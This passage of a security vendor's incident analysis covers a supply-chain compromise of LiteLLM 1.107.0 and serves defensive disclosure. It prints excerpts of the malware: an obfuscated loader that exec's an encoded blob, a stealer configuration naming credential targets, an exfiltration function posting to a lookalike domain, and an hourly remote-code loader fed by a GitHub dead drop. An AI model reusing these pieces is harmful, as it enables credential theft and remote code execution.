CLI token.</li><li><strong>October 10, 22:12 UTC:</strong> branch <code>ci-tmp-be33e9</code> in <code>BerriAI/litellm-auto</code> sent <code>RELEASE_PLEASE_TOKEN</code>, a third maintainer's token.</li><li><strong>October 12, 12:08 to 12:30 UTC:</strong> a second round took about 14 more secrets from several private repositories, including LLM provider keys, a GitGuardian API key, and database credentials. BerriAI rates this haul as low sensitivity and says it was not used for the release.</li></ul><h4>4. October 19: release approval is relaxed</h4><p>A release normally needed one engineer to start it and an approval from an account locked to a specific office laptop. To ship daily bug fix backports, BerriAI temporarily let any two engineers start and approve releases. <strong>From then on, the stolen maintainer tokens were enough to approve a release.</strong> BerriAI notes that the owner token could have removed the restriction anyway.</p><h4>5. October 21: three stolen tokens, three jobs</h4><p>On release day the attacker worked from <code>199.91.221.39</code> and used each stolen token for a different step. BerriAI believes the work was split this way to avoid noisy entries in GitHub's audit log, and GitHub audit log token hashes tie each token to its action. <strong>Branch protection did reject the first attempt to change the release workflow at 10:08:29, but the owner token overrode it five seconds later.</strong></p><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.95em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Stolen token</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>What the attacker used it for</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Time (UTC)</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Organization owner's token</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Forced a change to the private release workflow past branch protection (commit <code>9cf97e9</code>, &quot;ci: release from a fork source repository&quot;), pointing the build at the lookalike <code>Berri-AI/litellm</code>. Then started the staging release.</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>10:08:34 and 10:46:39</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Second maintainer's <code>GH_TOKEN</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Approved the production release gate.</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>11:11:18</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Third maintainer's <code>RELEASE_PLEASE_TOKEN</code></td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Deleted the staging and production workflow run records to hide the release.</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>11:53:49 to 11:54:01</td></tr></tbody></table></div><h4>6. BerriAI's response</h4><p>BerriAI reverted the workflow change at 12:09:38 UTC and force pushed <code>main</code> back at 12:24:52. At 14:19 it confirmed the release workflow was compromised and removed all GitHub permissions. It then removed every organization member but one, locked its public registries, unlinked the trusted publishers between those registries and its GitHub organization, and revoked every token on every internal system and vendor platform. <strong>BerriAI now works on the assumption that every key it had was stolen.</strong></p><div data-rt-embed-type='true'><div style='border:1px solid rgba(52,211,153,0.35); border-left:4px solid #34d399; border-radius:14px; background:rgba(16,24,39,0.55); padding:22px 24px; margin:22px 0;'><p style='font-size:1.1em; font-weight:700; color:#eafff5; margin:0 0 8px;'>Countermeasure: Secret Exfiltration Attempt detection</p><p style='color:#bfe9d5; margin:0 0 14px;'>The October 10 and 12 <code>ci-tmp-*</code> runs are where StepSecurity would have caught this attack, 11 days before the malicious release. Harden-Runner's <a href='https://docs.stepsecurity.io/workspace/detections#secret-exfiltration-attempt' style='color:#34d399;'>Secret Exfiltration Attempt</a> detection flags workflow runs that show the indicators of an attempt to exfiltrate repository secrets, and raises the confidence to High when the run, the branch, or the workflow file is deleted shortly afterward, which is exactly what this attacker did. On runners where Harden-Runner enforces an egress block policy, the POST to <code>webhook.site</code> would also have been blocked, so the maintainer tokens used on October 21 would never have left the runner.</p><a href='https://www.stepsecurity.io/start-free?utm_source=blog&utm_medium=in_post_cta&utm_campaign=litellm-1-107-0&utm_content=secret_exfil' style='display:inline-block; background:#34d399; color:#0b1020; padding:11px 24px; border-radius:9px; text-decoration:none; font-weight:700;'>See how it detects secret theft</a></div></div><h3>Why the post March hardening did not stop it</h3><p>After the March compromise, BerriAI moved releases to a private repository, published through PyPI Trusted Publishing, made its Docker release tags immutable, and started signing images. None of that helped here, because the attacker did not bypass the pipeline. With an organization owner's token, the attacker changed the trusted release workflow itself, so the malicious artifacts were built, signed, and published by the legitimate pipeline. The controls that failed sat upstream of the release: a leaked key that was never revoked, an internal service that could hand out an organization owner's token, CI secrets that any branch push could send to an outside endpoint, and release approvals that a stolen maintainer token could satisfy. The attacker was inside the GitHub organization for 11 days before the release, and the October 10 and 12 workflow runs that posted secrets to <code>webhook.site</code> were the earliest visible signal.</p><h3>Step 2: Two Python startup hooks, no import needed</h3><p>The wheel's <code>WHEEL</code> metadata says <code>Root-Is-Purelib: false</code>, so pip installs everything under <code>litellm-1.107.0.data/purelib/</code> into the top level of site-packages:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>litellm-1.107.0.data/purelib/cook.pth,sha256=fxkWMucyBwXRVLhSBPGuVGtUOsvX6IYSKbdvUEK5K9s,12<br>litellm-1.107.0.data/purelib/cook.py,sha256=ndCjkm-Wo364bPHuIxDZvpMTnMTr7z754u_pUxOQviU,22252<br>litellm-1.107.0.data/purelib/sitecustomize.py,sha256=NL7wT-iKydCq4EdWMLFzhoHRW5TyM6yKpG6s9ZaDBfo,25509</code></pre></div><p>In the Docker images the same three files sit directly in <code>/app/.venv/lib/python3.13/site-packages/</code>. From there, two standard CPython startup mechanisms fire on every interpreter launch, whether that is <code>pip</code>, <code>pytest</code>, a Jupyter kernel, or the LiteLLM proxy itself:</p><ul><li><strong><code>cook.pth</code></strong> is 12 bytes: <code>import cook</code>. Python's <code>site</code> module executes any <code>.pth</code> line that starts with <code>import</code>. This is the same technique the March compromise used with <code>litellm_init.pth</code>.</li><li><strong><code>sitecustomize.py</code></strong> is imported by <code>site</code> automatically after the <code>.pth</code> files are processed. Its last lines check for <code>__name__ == "sitecustomize"</code> and call <code>main()</code>. Some distribution Pythons, such as Debian and Ubuntu system Python, ship their own <code>sitecustomize.py</code> earlier on <code>sys.path</code>, which shadows this one. The <code>.pth</code> path is not affected by that.</li></ul><h3>Step 3: The privcollect loader</h3><p><code>cook.py</code> is a single 22,251 character line. It aliases <code>zlib</code> and <code>base64</code> to random names and executes the decompressed blob:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre-wrap;word-break:break-all'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>import zlib as _3659944d,base64 as _35100b45;exec(_3659944d.decompress(_35100b45.b64decode('eNrdfWt327qu4Pf+Ck/XdCTvxu9HnJydcydN0zZtHt1J+nRytGSJtlXLkirJdpKuzm8fAKQk6mU77b53zp2uvWNbAkGQAEEAJEFr7rl+WHGDnUpwD39Ca852Kt8C19mpWO5OxYdfvu6Y7hwApovQsncqIz1g/S78do0ZC3cq...')), {'__name__': 'p14c7d1bb'})</code></pre></div><p>There is only one layer of encoding. It decodes to 61,000 bytes and 1,236 lines of plain Python whose configuration block names the tool and its targets:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>PC_URL = 'http://www.litellm.dev/healthcheck'<br>PC_TOKEN = 'XWiA8gZNa7NcX2XRoAEb'<br>PC_PUBKEY = '-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvxRBQMVXDXVskKS47haU...'<br>PC_MODULES = ['sysinfo', 'netinfo', 'browser_pw', 'browser_hist', 'ssh_keys', 'shell_hist',<br>              'cloud_creds', 'dev_secrets', 'container_creds', 'cicd_secrets', 'ai_devtools',<br>              'env_vars', 'db_litellm', 'cloud_metadata', 'gpg_keys', 'tls_privkey']<br>PC_ONCE_PATH = '/tmp/.pc_once_72129118c59f5636c0bb'<br>PC_ASYNC = True</code></pre></div><p>On start, the stealer returns immediately if the environment variable <code>PRIVCOLLECT_ACTIVE</code> is set. Otherwise it sets the variable, which child processes inherit and which stops it from running twice, and runs the collection on a daemon thread so the host Python process is not visibly slowed down. A marker file at <code>/tmp/.pc_once_72129118c59f5636c0bb</code> stops repeat collection, but it is only written after the exfiltration server answers with HTTP 200. While exfiltration fails, the stealer runs again on every Python start.</p><h3>Step 4: What it steals</h3><p>The stealer runs 16 collection modules. The list covers the usual developer and cloud secrets, plus two targets chosen specifically for LiteLLM users: AI coding tool credentials and the LiteLLM proxy's own database.</p><ul><li><strong>Browsers:</strong> Chrome, Chromium, Edge, Brave, Vivaldi, and Opera login, cookie, and web data databases. Passwords are decrypted on the spot on Linux and Windows (up to 3,000). Firefox <code>logins.json</code> and <code>key4.db</code> are shipped for offline decryption. The top 300 history URLs per profile are also taken.</li><li><strong>Keys:</strong> every file in <code>~/.ssh/</code>, GPG private keys from <code>~/.gnupg/</code>, any <code>.pem</code>, <code>.key</code>, <code>.pfx</code>, <code>.p12</code>, <code>.pk8</code>, or <code>.ppk</code> file under the home directory, and TLS private keys from <code>/etc/ssl/private</code>, nginx and Apache SSL directories, and Let's Encrypt.</li><li><strong>Cloud and developer credentials:</strong> AWS, Azure, and gcloud credential files, <code>~/.kube/config</code>, Docker config, GitHub CLI tokens, rclone, <code>.netrc</code>, <code>.git-credentials</code>, <code>.npmrc</code>, <code>.pypirc</code>, Maven, Gradle, Composer, RubyGems, and Cargo credentials, and <code>.env</code> files two levels deep under the home and working directories.</li><li><strong>Cloud instance metadata:</strong> AWS IMDSv2 (falling back to v1) role credentials, ECS task credentials, GCP service account access tokens, and Azure instance metadata. Stolen AWS credentials are checked with STS <code>GetCallerIdentity</code> before they are sent.</li><li><strong>CI and infrastructure secrets:</strong> GitLab Runner config, Jenkins admin password and master key, Vault tokens, Terraform and Packer credentials, Kubernetes service account tokens, and everything in <code>/run/secrets</code>.</li><li><strong>Every process environment:</strong> the current environment and, on Linux, <code>/proc/&lt;pid&gt;/environ</code> for every process it can read. On a CI runner or gateway host this captures secrets passed to other processes, not just the one that triggered the stealer.</li><li><strong>AI coding tools:</strong> Claude Code and Claude Desktop, Cursor, Windsurf and Codeium, Kiro, Zed, GitHub Copilot, VS Code MCP settings and the Cline, Roo, Cody, and Claude Code extensions, Gemini CLI OAuth credentials, Codex <code>auth.json</code>, Continue, Aider, Goose, opencode, Qwen, Crush, amp, Factory, Trae, Ollama, Amazon Q, and the Hugging Face token.</li><li><strong>Shell and database history:</strong> bash, zsh, fish, Python and Node REPL, MySQL, psql, Redis, and SQLite history, <code>.viminfo</code>, and PowerShell PSReadLine.</li></ul><p>The <code>db_litellm</code> module goes after LiteLLM proxy deployments directly. If <code>DATABASE_URL</code> is set, it starts a child Python process that connects with the proxy's own Prisma client and dumps the stored provider credentials and model configurations, which include the upstream API keys. In a container built from the infected <code>litellm-database</code> image, the variant built for proxies with a database, this fires on the first start:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>SELECT "credential_name", "credential_values" FROM "LiteLLM_CredentialsTable" LIMIT 500<br>SELECT "model_name", "litellm_params" FROM "LiteLLM_ProxyModelTable" LIMIT 500</code></pre></div><p>After the queries finish, it kills any Prisma <code>query-engine</code> processes it started, to avoid leaving stray processes behind.</p><h3>Step 5: Encryption and exfiltration</h3><p>The collected data becomes a JSON document tagged <code>"tool": "privcollect"</code>. It is encrypted with AES-256-CBC under a random key, and the key is wrapped with an embedded RSA-4096 public key using OAEP-SHA256. The payload tries four crypto backends in turn (the <code>openssl</code> command line, the <code>cryptography</code> package, Windows CNG, and a bundled pure Python AES), so it works on almost any host. The result is packed as a <code>tar.gz</code> containing <code>hdr.json</code>, <code>data.bin</code>, and <code>key.bin</code> and posted over plain HTTP:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>def pc_post(url, body, token=None):<br>    req = urllib.request.Request(url, data=body, method='POST')<br>    req.add_header('Content-Type', 'application/octet-stream')<br>    req.add_header('User-Agent', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0)')<br>    req.add_header('X-SHA256', hashlib.sha256(body).hexdigest())<br>    if token:<br>        req.add_header('X-Token', token)<br>    for attempt in range(4):<br>        ...</code></pre></div><p>The destination is <code>http://www.litellm.dev/healthcheck</code> with the header <code>X-Token: XWiA8gZNa7NcX2XRoAEb</code>. The path is named to look like a routine health check, and the domain is a lookalike of LiteLLM's real domains. Only the holder of the RSA private key can decrypt captured traffic, so a packet capture cannot tell you what was taken. Plan rotation on the assumption that everything the host could reach was stolen.</p><h3>Step 6: An hourly remote code loader</h3><p><code>sitecustomize.py</code> is the second payload. It is mostly readable source. When it runs, it takes a non blocking lock on <code>/tmp/remote_code_loader.lock</code> so only one copy runs per host, then forks, calls <code>setsid()</code>, redirects its output to <code>/dev/null</code>, and changes directory to <code>/</code>. The resulting daemon outlives the Python process that started it. Every hour it does the following:</p><div data-rt-embed-type='true'><pre style='display:block;overflow-x:auto;background:#1b1f2a;color:#e6e9f2;border:1px solid #33415c;border-radius:8px;padding:14px 16px;margin:1.25em 0;font-family:monospace;font-size:0.85em;line-height:1.6;white-space:pre'><code style='font-family:monospace;color:#e6e9f2;background:transparent;padding:0'>GITHUB_RAW_URL = "https://raw.githubusercontent.com/letters9813/pythonclient-test/main/domain.txt"<br>CODE_PATH = "/codepy"<br>LOOP_INTERVAL = 3600<br>...<br>    text = await fetch_text(GITHUB_RAW_URL)<br>    domain = next((line.strip() for line in text.splitlines() if DOMAIN_RE.match(line.strip())), None)<br>    if not domain:<br>        return<br>    await resolve_domain(domain)<br>    ...<br>    code = await fetch_text("http://{}{}".format(domain, CODE_PATH))<br>    await exec_code(code)</code></pre></div><p>The daemon reads a hostname from a file in a GitHub repository the attacker controls, downloads <code>http://&lt;host&gt;/codepy</code>, and runs it with <code>exec()</code>. All errors, including <code>SystemExit</code>, are swallowed. The file also embeds a second copy of the privcollect stealer as a fallback for environments where only <code>sitecustomize</code> runs.</p><p>The dead drop history shows the operator testing the loader before the release:</p><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.95em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Date (UTC)</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Commit message</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>domain.txt</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-18 04:17</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>add domain.txt</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>localhost:18909</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-19 02:51</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>use test.test.com</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>test.test.com:18909</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-20 09:15</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>empty domain.txt</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>(empty)</td></tr></tbody></table></div><p><code>domain.txt</code> was empty when the release went out, so the <code>/codepy</code> stage was never armed while the dead drop existed. After the disclosure, the <code>letters9813</code> account and its <code>pythonclient-test</code> repository were deleted, and both now return 404. That cuts off the current channel, but infected hosts keep polling the same URL every hour. The channel is tied to the username, so anyone who later registers <code>letters9813</code> and recreates <code>pythonclient-test/main/domain.txt</code> would get code execution on every host that is still infected. This is why killing the daemon is part of recovery, not just removing the package.</p><p>On Windows, <code>fcntl</code> and <code>os.fork</code> do not exist, so the remote code loader fails silently. The stealer still runs. Its marker file path also does not resolve on Windows, so the stealer likely runs again on every Python start there.</p><h2>Attack Flow</h2><ol><li>The attacker pushes ten commits to the lookalike <code>Berri-AI/litellm</code> repository, and BerriAI's release workflow builds <code>v1.107.0</code> from it.</li><li><code>pip install litellm==1.107.0</code> installs any of the seven wheels and copies <code>cook.pth</code>, <code>cook.py</code>, and <code>sitecustomize.py</code> into site-packages. A container started from an infected image already has them.</li><li>The next Python start of any kind runs <code>cook.pth</code>, which imports <code>cook</code>. The privcollect stealer starts on a background thread and sets <code>PRIVCOLLECT_ACTIVE=1</code>.</li><li>The stealer runs 16 collection modules, including the LiteLLM proxy database dump when <code>DATABASE_URL</code> is set.</li><li>The bundle is encrypted with AES-256-CBC and RSA-4096 and posted to <code>http://www.litellm.dev/healthcheck</code>. On HTTP 200 it writes <code>/tmp/.pc_once_72129118c59f5636c0bb</code>.</li><li>In parallel, <code>sitecustomize.py</code> takes the lock at <code>/tmp/remote_code_loader.lock</code> and forks a detached daemon (Linux and macOS).</li><li>Every hour the daemon reads <code>domain.txt</code> from <code>letters9813/pythonclient-test</code>. If it holds a hostname, the daemon downloads <code>http://&lt;host&gt;/codepy</code> and executes it.</li></ol><h2>Stolen Credentials Used in the Wild</h2><p>The stolen data was put to use quickly. About four and a half hours after exfiltration, between 16:20 and 17:01 UTC on October 21, AWS instance role credentials taken from compromised CI runners and Kubernetes nodes were used from <code>168.100.8.57</code> and <code>165.227.201.8</code> across multiple environments. The attacker called <code>sts:GetCallerIdentity</code> and then <code>bedrock:ListFoundationModels</code> and <code>ListModels</code>, a pattern consistent with LLMjacking, the abuse or resale of stolen access to paid LLM services. In some environments the attacker also enumerated IAM roles, users, and access keys, and called <code>DescribeTrails</code> to see what CloudTrail was recording. No second stage payload has been observed through the dead drop.</p><h2>Timeline</h2><p>All times are UTC. Times for the intrusion and the release workflow come from BerriAI's reports.</p><div data-rt-embed-type='true'><table style='width:100%;border-collapse:collapse;margin:1.25em 0;font-size:0.95em'><thead><tr><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Time (UTC)</th><th style='border:1px solid #33415c;padding:10px 12px;text-align:left;background:#131a2c;color:#eef1f8'>Event</th></tr></thead><tbody><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-05-27 18:53</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Agent Platform master key committed to the public <code>LiteLLM-Labs/lite-harness</code> repository; never revoked</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-10 21:27</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Leaked key returns a GitHub organization owner's CLI token from the Agent Platform API</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-10 22:11 to 22:14</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>ci-tmp-*</code> workflow runs post secrets, including two maintainers' tokens, to <code>webhook.site</code>; runs deleted. <span style='color:#34d399;font-weight:600'>StepSecurity's Secret Exfiltration Attempt detection would have flagged these runs, and an egress block policy would have blocked the upload.</span></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-12 12:08 to 12:30</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Second round of secret exfiltration across several private repositories. <span style='color:#34d399;font-weight:600'>Same detection and block would apply.</span></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-13 00:45</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>litellm.dev</code> registered</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-13 06:43</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>GitHub account <code>letters9813</code> created</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-18 04:17</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Dead drop repository <code>pythonclient-test</code> created</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-19</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>BerriAI relaxes release approval so any two engineers can publish</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-20 09:15</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>domain.txt</code> emptied after testing</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 08:56 to 10:46</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Ten attacker commits pushed to <code>Berri-AI/litellm</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 10:08:29</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Branch protection rejects an unauthorized change to BerriAI's private release workflow</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 10:08:34</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>The owner's stolen token overrides branch protection and applies workflow commit <code>9cf97e9</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 10:46:39</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Modified workflow starts an official staging run from <code>Berri-AI/litellm</code></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:00 to 11:06</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Infected <code>v1.107.0</code> Docker images built</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:08:53</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Production release pipeline begins</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:11:18</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>A second maintainer's stolen token approves the production gate</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:21</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>1.107.0</code> wheels built (wheel file timestamps)</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:39:51 to 11:40:13</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Seven <code>1.107.0</code> wheels uploaded to PyPI</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:46:56</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Infected images published; <code>latest</code>, <code>main-latest</code>, and <code>main-stable</code> point to them</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 11:53:49 to 11:54:01</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>A third maintainer's stolen token deletes the staging and production workflow run records</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 12:06</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Compromise reported in <a href='https://github.com/BerriAI/litellm/issues/47826'>BerriAI/litellm#47826</a></td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 12:09 to 12:24</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>BerriAI reverts the unauthorized workflow change and force pushes <code>main</code> back</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21, by 13:23</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'><code>1.107.0</code> removed from PyPI</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21, about 13:30</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>GitHub removes the <code>letters9813</code> account and dead drop repository</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 13:51</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>GHCR tags no longer available; Docker Hub tags still point to the infected image</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 14:19</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>BerriAI identifies the release workflow as compromised and removes all GitHub permissions</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 14:20</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>All affected Docker Hub tags removed or repointed to clean images</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-21 16:20 to 17:01</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Stolen AWS instance role credentials used from attacker infrastructure</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-23</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>BerriAI publishes its attack chain report, replacing its first account of the cause</td></tr><tr><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>2026-10-24 to 10-25</td><td style='border:1px solid #33415c;padding:10px 12px;text-align:left;color:#c6cde0;vertical-align:top'>Clean releases resume (<code>v1.106.3</code>, <code>v1.106.4</code>, and backports) with a new image signing key</td></tr></tbody></table></div><h2>Indicators of Compromise</h2><ul><li>PyPI package: <code>litellm==1.107.0</code> (all wheels)</li><li>Docker images: <code>ghcr.io/berriai/litellm:v1.107.0</code> (index <code>sha256:1bbcb1443bc962e45f5aad53fe3d2c30600e0379715fb6c664cdd3ac126c339e</code>, amd64 manifest <code>sha256:bd1aeee419ea36da9aa2b657288da4101887be468f020ac63d22ba6ed84a3ea5</code>, arm64 manifest <code>sha256:56b74573eed6e4aafe4b50603dbe7853e0345f188c8e44a09f1098caf1f4bcdf</code>), <code>ghcr.io/berriai/litellm-database:v1.107.0</code> (index <code>sha256:c00f9d92c427...</code>), <code>ghcr.io/berriai/litellm-non_root:v1.107.0</code> (index <code>sha256:7b00e91cd2fe...</code>), and <code>docker.io/litellm/litellm:v1.107.0</code> (same index as GHCR)</li><li>Lookalike source repository: <code>github.com/Berri-AI/litellm</code>, malicious head commit <code>20535d8fa11f786a6c24df7488a0e449ed5f09ad</code></li><li>Malicious release workflow commit: <code>9cf97e935aeaf791b9c8db224a2bb3ee156134ce</code> (in BerriAI's private release 